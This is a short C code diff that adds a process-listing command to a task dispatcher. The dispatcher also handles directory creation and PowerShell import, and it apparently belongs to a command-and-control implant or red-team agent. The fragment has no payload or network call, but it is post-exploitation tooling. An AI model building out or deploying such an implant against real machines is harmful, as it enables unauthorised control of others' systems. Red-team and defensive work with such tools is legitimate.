@@ -115,6 +115,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_FILE_MKDIR:
 			FilesystemMkdir(buffer, size);
 			break;
+		case COMMAND_PS_LIST:
+			ProcessList(buffer, size);
+			break;
 		case COMMAND_PSH_IMPORT:
 			PowershellImport(buffer, size);
 			break;
